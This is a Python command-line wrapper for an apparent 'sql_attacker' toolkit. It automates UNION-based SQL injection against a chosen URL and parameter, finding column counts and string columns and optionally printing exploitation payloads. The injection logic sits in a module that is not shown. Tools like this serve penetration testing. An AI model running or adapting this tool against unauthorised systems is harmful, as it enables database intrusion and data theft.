#!/usr/bin/env python3
"""
SQL Fingerprinter CLI Tool

Command-line interface for the SQL Fingerprinter module.
Provides easy access to column count and string column discovery.

Usage:
    python sql_fingerprinter_cli.py --url "http://example.com/page" --param "id" 
    python sql_fingerprinter_cli.py --url "http://example.com/page" --param "id" --db-type oracle
    python sql_fingerprinter_cli.py --url "http://example.com/page" --param "id" --max-cols 15 --delay 1.0
"""

import sys
import os
import argparse

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sql_attacker.sql_fingerprinter import SqlFingerprinter, DatabaseType

# Try to import requests, but provide fallback
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("Warning: 'requests' library not found. Using urllib instead.")
    import urllib.request
    import urllib.parse


def create_transport_requests(url, param_name, method='GET', headers=None, cookies=None):
    """Create transport function using requests library"""
    
    def transport(payload):
        try:
            if method.upper() == 'GET':
                params = {param_name: payload}
                response = requests.get(url, params=params, headers=headers, 
                                       cookies=cookies, timeout=10, verify=False)
            else:  # POST
                data = {param_name: payload}
                response = requests.post(url, data=data, headers=headers, 
                                        cookies=cookies, timeout=10, verify=False)
            
            return {
                'status_code': response.status_code,
                'content': response.text,
                'length': len(response.text)
            }
        except Exception as e:
            return {
                'status_code': 0,
                'content': f"Error: {str(e)}",
                'length': 0,
                'error': str(e)
            }
    
    return transport


def create_transport_urllib(url, param_name, method='GET'):
    """Create transport function using urllib (fallback)"""
    
    def transport(payload):
        try:
            encoded_payload = urllib.parse.quote(payload)
            
            if method.upper() == 'GET':
                full_url = f"{url}?{param_name}={encoded_payload}"
                req = urllib.request.Request(full_url)
            else:  # POST
                data = urllib.parse.urlencode({param_name: payload}).encode('utf-8')
                req = urllib.request.Request(url, data=data)
            
            with urllib.request.urlopen(req, timeout=10) as response:
                content = response.read().decode('utf-8')
                return {
                    'status_code': response.status,
                    'content': content,
                    'length': len(content)
                }
        except Exception as e:
            return {
                'status_code': 0,
                'content': f"Error: {str(e)}",
                'length': 0,
                'error': str(e)
            }
    
    return transport


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='SQL Fingerprinter - Automated UNION-based SQL injection column discovery',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --url "http://example.com/page" --param "id"
  %(prog)s --url "http://example.com/page" --param "id" --db-type oracle
  %(prog)s --url "http://example.com/page" --param "id" --max-cols 15 --delay 1.0
  %(prog)s --url "http://example.com/page" --param "id" --method POST --cookie "session=abc123"
        """
    )
    
    # Required arguments
    parser.add_argument('--url', required=True,
                       help='Target URL (e.g., http://example.com/page)')
    parser.add_argument('--param', required=True,
                       help='Vulnerable parameter name (e.g., id)')
    
    # Optional arguments
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET',
                       help='HTTP method to use (default: GET)')
    parser.add_argument('--db-type', choices=['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite'],
                       help='Pre-set database type (auto-detect if not specified)')
    parser.add_argument('--max-cols', type=int, default=20,
                       help='Maximum number of columns to test (default: 20)')
    parser.add_argument('--start-cols', type=int, default=1,
                       help='Starting number of columns to test (default: 1)')
    parser.add_argument('--delay', type=float, default=0.0,
                       help='Delay between requests in seconds (default: 0.0)')
    parser.add_argument('--marker', default="'SQLFingerprint'",
                       help='Custom marker string for detection (default: \'SQLFingerprint\')')
    parser.add_argument('--cookie', 
                       help='Cookie header value (e.g., "session=abc123")')
    parser.add_argument('--user-agent',
                       help='Custom User-Agent header')
    parser.add_argument('--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('--quiet', action='store_true',
                       help='Minimal output (only results)')
    parser.add_argument('--column-count-only', action='store_true',
                       help='Only discover column count (skip string detection)')
    parser.add_argument('--generate-payloads', action='store_true',
                       help='Generate exploitation payloads after fingerprinting')
    
    return parser.parse_args()


def main():
    """Main CLI entry point"""
    args = parse_arguments()
    
    # Print banner unless quiet mode
    if not args.quiet:
        print("=" * 70)
        print("SQL FINGERPRINTER CLI")
        print("Automated UNION-based SQL Injection Column Discovery")
        print("=" * 70)
        print()
    
    # Parse database type
    db_type = None
    if args.db_type:
        db_type = DatabaseType(args.db_type)
        if not args.quiet:
            print(f"Database Type: {db_type.value.upper()} (pre-set)")
    
    # Build headers
    headers = {}
    if args.user_agent:
        headers['User-Agent'] = args.user_agent
    
    # Parse cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for cookie_pair in args.cookie.split(';'):
            if '=' in cookie_pair:
                key, value = cookie_pair.strip().split('=', 1)
                cookies[key] = value
    
    # Create transport function
    if not args.quiet:
        print(f"Target URL: {args.url}")
        print(f"Parameter: {args.param}")
        print(f"Method: {args.method}")
        print()
    
    if HAS_REQUESTS:
        transport = create_transport_requests(
            args.url, args.param, args.method, headers, cookies
        )
    else:
        transport = create_transport_urllib(args.url, args.param, args.method)
    
    # Initialize fingerprinter
    fingerprinter = SqlFingerprinter(
        transport,
        verbose=args.verbose and not args.quiet,
        delay=args.delay,
        database_type=db_type
    )
    
    try:
        # Perform fingerprinting
        if args.column_count_only:
            # Only column count
            if not args.quiet:
                print("Discovering column count...")
            result = fingerprinter.discover_column_count(
                max_columns=args.max_cols,
                start_columns=args.start_cols
            )
        else:
            # Full fingerprint
            if not args.quiet:
                print("Performing full fingerprinting...")
            result = fingerprinter.full_fingerprint(
                max_columns=args.max_cols,
                marker=args.marker
            )
        
        # Display results
        if args.quiet:
            # Minimal output
            if result.success:
                print(f"{result.column_count}", end='')
                if result.string_columns:
                    print(f",{','.join(map(str, result.string_columns))}")
                else:
                    print()
            else:
                print("FAILED")
                sys.exit(1)
        else:
            # Full report
            print()
            print(fingerprinter.format_report(result))
        
        # Generate exploitation payloads if requested
        if args.generate_payloads and result.success and result.string_columns:
            if not args.quiet:
                print("\nGenerating exploitation payloads...")
            
            payloads = fingerprinter.generate_exploitation_payloads(
                column_count=result.column_count,
                string_columns=result.string_columns
            )
            
            if payloads:
                print("\nExploitation Payloads:")
                for i, payload in enumerate(payloads, 1):
                    print(f"  {i}. {payload}")
            else:
                print("\nNo exploitation payloads could be generated.")
        
        # Exit with success
        if result.success:
            sys.exit(0)
        else:
            sys.exit(1)
    
    except KeyboardInterrupt:
        print("\n\nInterrupted by user.")
        sys.exit(130)
    except Exception as e:
        print(f"\n✗ ERROR: {e}", file=sys.stderr)
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
